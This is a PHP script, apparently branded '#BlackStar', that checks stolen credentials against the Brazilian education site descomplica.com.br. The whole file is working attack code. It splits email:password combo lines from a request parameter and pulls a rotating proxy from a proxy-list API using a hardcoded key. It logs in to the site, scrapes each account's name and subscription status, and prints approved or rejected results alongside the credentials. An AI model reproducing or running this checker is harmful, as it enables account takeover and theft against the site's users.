<?php

error_reporting(0);
set_time_limit(0);
DeletarCookies();

extract($_GET);

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

function multiexplode ($delimiters,$string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}

list($email, $senha) = multiexplode(array(";","|",":"," » "," "),$linhas);

function dados($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} //funcao para puxar os dados

        $link = file_get_contents("https://api.getproxylist.com/proxy?apiKey=2769d07972701a1cb65b10f9565e205f3fcd463a&protocol=socks4&lastTested=600");
        $link2 = json_decode($link);
        $link3 = $link2 ->ip;
        $link4 = $link2 ->port;
        $proxy = $link3.":".$link4;

        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://descomplica.com.br/entrar");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: descomplica.com.br',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Accept: */*',
        'Accept-Language: pt-BR,pt;q=0.5',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Referer: https://descomplica.com.br/entrar/',
        'Connection: keep-alive'
    ));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'Email='.$email.'&Password='.$senha.'&ReturnUrl=ajax&OriginUrl=https%3A%2F%2Fdescomplica.com.br%2Fentrar%2F');   
        $result = curl_exec($ch);


        curl_setopt($ch, CURLOPT_URL, "https://descomplica.com.br/configuracoes/");
        curl_setopt($ch, CURLOPT_POST, 0);
        $result2 = curl_exec($ch);

        if (strpos($result2, '<a data-reactid="69">Mais detalhes</a>') !== false) {

            $sex = "<font style='color: #262626;'>True</font>";
        }else{
            
            $sex = "<font style='color: #262626;'>False</font>";
         }

        curl_setopt($ch, CURLOPT_URL, "https://descomplica.com.br/configuracoes/perfil/");
        curl_setopt($ch, CURLOPT_POST, 0);
        $result3 = curl_exec($ch);

        $name = dados($result3, '"firstName":"','"', 1);
        $last = dados($result3, '"lastName":"','"', 1);

       // echo $result3;


    

        if (strpos($result, '"Success":true,"') !== false) {

            echo "<b><i><font style='color: green;'>Aprovada ✔&nbsp;&nbsp;</font></i>  $email|$senha | Nome: $name | Plano: $sex <font style='color: MidnightBlue;'>#BlackStar©</font></b>";
        }else{
             echo "<font style='color: red;'>Reprovada ❌</font>  $email|$senha <font style='color: DeepSkyBlue;'>#BlackStar©</font>";
        }

             if (file_exists(getcwd().'/teste.txt')) {
            unlink(getcwd().'/teste.txt');
        }
?>